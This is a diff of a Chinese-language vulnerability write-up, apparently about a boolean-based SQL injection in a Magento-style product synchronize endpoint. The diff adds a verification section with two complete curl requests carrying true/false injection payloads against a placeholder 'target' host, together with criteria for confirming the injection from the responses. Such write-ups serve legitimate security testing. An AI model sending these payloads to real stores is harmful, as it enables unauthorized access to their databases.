@@ -38,7 +38,12 @@ curl "http://target:8080/catalog/product_frontend_action/synchronize?type_id=rec
 ## 验证方法
 
 ```bash
-# 检查两个请求返回的状态码是否不同
+# 按 ## Payload 发两条只差 1=1 / 1=0 的请求，比较响应体
+curl -s "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-"
+curl -s "http://target:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-"
+# 判据：真条件返回的商品 JSON 列表（含 entity_id / name 字段）与假条件不同 ——
+#      或真条件返回商品条目、假条件返回空列表；差异必须只随条件真假变化，重复请求稳定复现
+# 反例：两条响应体完全一致，或都返回同一个报错页 HTML → 不能判定注入成立
 ```
 
 ## 修复建议
